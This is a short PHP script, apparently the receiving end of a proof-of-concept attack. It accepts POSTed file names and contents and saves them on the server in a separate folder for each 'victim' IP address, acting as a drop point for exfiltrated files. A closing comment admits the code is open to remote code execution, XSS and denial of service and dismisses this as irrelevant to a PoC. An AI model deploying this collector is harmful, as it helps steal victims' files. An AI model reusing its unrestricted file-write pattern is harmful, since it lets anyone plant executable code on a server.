<?php

if (isset($_POST['fname'])){
    $fname = basename($_POST['fname']); // name of the uploaded file.
    $contents = $_POST['contents']; // contents of the uploaded file.
    $ip = $_SERVER['REMOTE_ADDR']; // Victim IP address.
    is_dir($ip) || mkdir($ip); // Create a directory for the victim based on his IP address.
    file_put_contents("$ip/$fname",$contents); // Save the uploaded file on the server.
    die();
}
/*
Yeah! Above codes are vulnerable to RCE, XSS, DoS.
This is just a PoC! Ignore them!
*/
?>
